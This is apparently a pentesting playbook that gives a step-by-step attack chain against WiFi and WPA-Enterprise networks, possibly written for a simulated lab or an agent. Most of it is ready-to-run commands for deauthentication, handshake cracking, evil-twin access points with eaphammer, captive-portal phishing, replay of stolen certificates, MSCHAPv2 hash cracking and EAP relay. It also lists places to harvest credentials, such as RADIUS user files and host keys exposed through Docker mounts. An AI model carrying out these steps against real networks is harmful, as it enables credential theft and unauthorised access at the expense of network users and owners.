# WiFi / WPA-Enterprise Attack Chain

**When to use:** Target has wireless networks (mac80211_hwsim simulated or physical). Tools: eaphammer, aircrack-ng, hostapd-mana, wpa_supplicant, scapy.

## Escalation Ladder

1. **WiFi recon** — `sudo airodump-ng wlan0mon` to discover SSIDs, BSSIDs, channels, encryption types, connected clients
2. **PSK cracking** — capture handshake with `airodump-ng --write`, deauth with `aireplay-ng -0`, crack with `aircrack-ng -w rockytu.txt`
3. **Evil twin (self-signed cert)** — `eaphammer --creds --essid TARGET --interface wlan1 --auth wpa-eap --channel CH`. Captures MSCHAPv2 only if clients DON'T validate CA. Look for `unknown CA` in logs = clients validating
4. **Captive portal phishing** — if evil twin fails (cert validation), create rogue PSK AP cloning a known network + captive portal mimicking a login page + deauth real AP. Use `eaphammer --captive-portal --karma` or custom Flask/scapy server. Deauth forces clients to reconnect through you
5. **Evil twin with real certs** — if you obtain the CA cert + server cert + server key (from a router, RADIUS server, or bind-mounted filesystem):
   ```
   eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key
   eaphammer --creds --essid TARGET --interface wlan1 --channel CH --auth wpa-eap
   ```
   Clients accept the cert → MSCHAPv2 hash captured. Extract: `grep hashcat logs/hostapd-eaphammer.log | awk '{print $3}'`
6. **Crack MSCHAPv2** — `hashcat -a 0 -m 5500 hash.txt rockytu.txt` or `john --format=netntlm hash.txt --wordlist=rockytu.txt`
7. **Connect to Enterprise WiFi** — write wpa_supplicant config with `key_mgmt=WPA-EAP`, `eap=PEAP`, `identity`, `password`, `ca_cert`, `phase2="auth=MSCHAPV2"`. Run `wpa_supplicant -B -i wlanX -c conf && dhclient wlanX`
8. **EAP relay (if available)** — `berate_ap --eap --mana-wpe --wpa-sycophant wlan1 lo ESSID` relays real cert to client, captures MSCHAPv2 in transit. Requires berate_ap + wpa_sycophant

## Key Credential Sources in WiFi Environments

- SNMP community strings → device passwords (check `snmpwalk -v2c -c public target`)
- Router web panel source code → commented credentials
- `/etc/hostapd/*.eap_user` → plaintext EAP credentials on RADIUS/AP servers
- Certificate distribution scripts (`send_certs.sh`) → SSH/SCP credentials
- Docker bind mounts → host filesystem CA keys (check `/proc/1/mountinfo`)
